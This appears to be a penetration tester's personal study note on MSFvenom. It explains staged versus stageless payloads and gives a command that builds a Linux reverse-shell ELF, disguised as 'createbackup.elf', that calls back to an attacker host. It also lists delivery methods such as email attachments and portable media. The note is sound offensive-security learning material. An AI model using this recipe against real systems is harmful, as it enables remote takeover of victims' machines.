```table-of-contents
title: ## Table of Contents
style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
minLevel: 0 # Include headings from the specified level
maxLevel: 3 # Include headings up to the specified level
includeLinks: true # Make headings clickable
debugInConsole: false # Print debug info in Obsidian console
```

## Summary
MSFvenom is a tool within the [[Metasploit]] framework for creating, encrypting & encoding payloads. The delivery of these payloads is up to the attacker, this tool only aids to creates them. This is a really useful tool if we don't have direct access to the target system but we need a payload that we can deliver another way (eg. social engineering).

### Staged vs Stageless Payloads
A *staged* payload will only setup a 'small stage' that will then call back to the attack box to download the rest of the payload, and execute it. These take up space in memory so there is less space for the actual payload. These are useful when an exploit scenario has little space for a large payload to be uploaded but instead we could upload a stage that then downloads a larger payload into a more suitable place / into larger memory.

A *stageless* payload does not have a stage. The entire payload is sent over the network connection at once. This could benefit us in environments with little bandwidth or latency where a staged payload may not be stable enough. Sometimes these can be better for evasion too as they cause less network traffic, which could be helpful for a social engineering attack.

The description or the format of the name of the payload can identify if it is staged or stageless.
```bash
# Staged (indicated by the /'s ) we can see the different stages (eg. {0} create a shell, {1} then create a reverse tcp)
windows/meterpreter/reverse_tcp
linux/x86/shell/reverse_tcp

# Stageless
windows/meterpreter_reverse_tcp
linux/zarch/meterpreter_reverse_tcp
```

![[Metasploit#Installation]]

## Documentation
**Cheatsheet:** 
**Website:** 
## Usage

### List all payloads
```sh
msfvenon -l payloads
# Payloads will commonly be named with their OS first eg. windows/dllinject/bind_tcp
```

### Building a stageless payload
```bash
msfvenom -p [payload_path] [options] -f [binary_format] > [file_name].[binary_format]

msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.112 LPORT=443 -f elf > createbackup.elf
```
We could then deliver this to our target system, common ways include:
- Email with file attached
- Download link on a website
- Combined with a metasploit exploit (but would likely need us to be on the internal network)
- Via portable media during an on-site attack
> We also need to make sure it gets executed once on the system.

![[Metasploit#Scanning a payload for possible detection]]